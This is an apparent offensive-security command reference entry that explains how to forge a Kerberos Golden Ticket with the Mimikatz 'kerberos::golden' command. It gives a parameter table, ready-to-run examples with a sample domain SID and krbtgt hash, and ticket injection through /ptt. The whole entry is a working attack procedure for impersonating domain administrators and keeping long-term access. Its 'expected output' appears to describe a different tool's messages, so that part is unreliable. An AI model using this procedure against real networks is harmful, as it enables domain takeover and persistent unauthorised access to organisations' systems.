---
id: a583b4b9-055a-45d4-89a2-4dbf624adf05
name: Generate-Golden-Kerberos-Ticket
type: command
executor: powershell
data: >-
  kerberos::golden /user:$_USERNAME /domain:$_DOMAIN /sid:$_DOMAIN_SID
  /krbtgt:$_KRBGTG_HASH /ticket:$_TICKET_FILE /ptt
output: null
created_at: '2023-04-06T03:56:28.444691+00:00'
updated_at: '2023-04-10T20:37:25.781492+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - golden-ticket
  - forgery
verified: true
validated: true
---

# Generate-Golden-Kerberos-Ticket

## Command

```powershell
kerberos::golden /user:$_USERNAME /domain:$_DOMAIN /sid:$_DOMAIN_SID /krbtgt:$_KRBGTG_HASH /ticket:$_TICKET_FILE /ptt
```

## Description

This command forges a Golden Ticket using the provided krbtgt NTLM hash and domain details, optionally saving it to a file and injecting it into the current session with the /ptt flag for immediate use in pass-the-ticket attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | The username for the forged ticket (e.g., Administrator) | Yes |
| /domain:$_DOMAIN | The target domain name (e.g., example.com) | Yes |
| /sid:$_DOMAIN_SID | The domain SID (e.g., S-1-5-21-3737340914-2019594255-2413685307) | Yes |
| /krbtgt:$_KRBGTG_HASH | The 16-byte NTLM hash of the krbtgt account | Yes |
| /ticket:$_TICKET_FILE | Output file for the ticket (e.g., golden.tgt); optional if /ptt used | No |
| /ptt | Inject the ticket into the current logon session | No |

## Examples

### Basic Usage with Injection

```powershell
kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ptt
```

### Save to File Without Injection

```powershell
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tgt
```

## Expected Output

On success: "[*] Action: Creating Golden Ticket..." followed by "[*] Ticket successfully imported to the current logon session." The ticket will have a long validity period (e.g., 10 years). Errors may include invalid hash format or missing parameters.

## Related

- [[procedures/Golden-Ticket-Creation-via-Kerberos-Purge]]
- [[tools/Rubeus]]
